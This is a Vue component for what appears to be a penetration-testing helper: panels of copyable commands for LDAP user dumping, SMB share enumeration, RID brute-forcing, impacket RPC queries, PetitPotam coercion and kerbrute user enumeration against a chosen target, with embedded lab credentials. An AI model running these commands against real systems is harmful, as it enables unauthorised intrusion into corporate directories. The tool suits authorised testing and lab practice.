<template>
  <div class="demo-collapse">
    <el-collapse v-model="activeNames" @change="handleChange" accordion>
      <el-collapse-item
        v-for="(command, key_c, index) in commands"
        :key="index"
        :name="index + 1"
      >
        <template #title>
          <span class="custom-title">{{ key_c }}</span>
        </template>
        <div
          v-for="(commandContent, commandName) in command"
          :key="commandName"
          class="input-container"
        >
          <label :for="key">{{ commandName }}:</label>
          <el-input
            :id="key"
            v-model="command[commandName]"
            readonly
            type="textarea"
            :autosize="{ minRows: 1, maxRows: 5 }"
          >
          </el-input>
          <el-button @click="copyToClipboard(command[commandName])"
            >复制</el-button
          >
        </div>
      </el-collapse-item>
    </el-collapse>
  </div>
</template>

<script>
import { mapState } from "vuex";
import {
  copyToClipboard,
  resetCommands,
  updateCommands,
} from "@/utils/utils.js";
export default {
  computed: {
    ...mapState(["sharedData"]), // 映射 Vuex state
  },
  methods: {
    async copyToClipboard(text) {
      const message = await copyToClipboard(text);
      this.$message.success(message);
    },
  },
  watch: {
    sharedData(newValue) {
      const storedData = localStorage.getItem("sharedData");
      if (!storedData || JSON.stringify(newValue) !== storedData) {
        localStorage.setItem("sharedData", JSON.stringify(newValue));
        console.log("已更新 sharedData:", newValue);
      }
      console.log("共享数据更新:", newValue["local_ip"]); // 当 sharedData 变化时打印数据
      if (this.attack_ip !== "{{Attack_IP}}") {
        resetCommands(this.commands, this.attack_ip); // 更新命令
      }
      this.attack_ip = newValue["attack_ip"];
      updateCommands(this.commands, this.attack_ip); // 更新命令
    },
  },
  data() {
    return {
      attack_ip: "{{Attack_IP}}", // 使用 data 定义响应式数据
      commands: {
        "ldap (389)": {
          批量获取AD用户登录名:
            'ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt ',
          ldapsearch2:
            "ldapsearch -x -h {{Attack_IP}} -b 'dc=example,dc=com' -D 'cn=admin,dc=example,dc=com' -w 'password' -s sub '(objectclass=*)' -LLL -E pr=1000/noprompt -z 1 -",
        },
        "SMB (139,445) enum": {
          nmap: "nmap --script smb-vuln* -p 139,445 {{Attack_IP}}",
          "Enumerate Host": "netexec smb {{Attack_IP}}",
          "List Shares1":
            "netexec smb {{Attack_IP}} -u [user] -p [pass] --shares",
          "List Shares2": "netexec smb {{Attack_IP}} -u guest -p '' --shares",
          "List Shares3": "smbclient -N -L //{{Attack_IP}}",
          "Enumerate Files1": "smbclient //{{Attack_IP}}/[share] -N",
          "Enumerate Files2":
            "smbclient //{{Attack_IP}}/[share] -U [username] [password]",
          "Enumerate Files3": "netexec smb -u [user] -p [pass] -M spider_plus",
          "Enumerate Files4":
            "smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass - Kerberos auth",
          "Enumerate Files5":
            "manspider.py --threads 256 [IP/CIDR] -u [username] -p [pass] [options]",
          "User enumeration1": "lookupsid.py guest@{{Attack_IP}} -no-pass",
          "User enumeration2":
            "netexec smb {{Attack_IP}} -u guest -p '' --rid-brute",
        },
        "RPC (135,139) ": {
          rpcclient: "rpcclient -U '' -N {{Attack_IP}}",
          PetitPotam:
            "python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1",
          "impacket-services":
            "python3 services.py test.local/john:password123@{{Attack_IP}} list",
          "impacket-samrdump":
            "python3 samrdump.py test.local/john:password123@{{Attack_IP}}",
          "impacket-rpcdump":
            "python3 rpcdump.py test.local/john:password123@{{Attack_IP}}",
          "impacket-lookupsid":
            "python3 lookupsid.py test.local/john:password123@{{Attack_IP}}",
        },
        "Kerberos (88)": {
          用户枚举:
            "kerbrute userenum --domain domain-test --dc {{Attack_IP}} /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt",
        },
      },
    };
  },
};
</script>
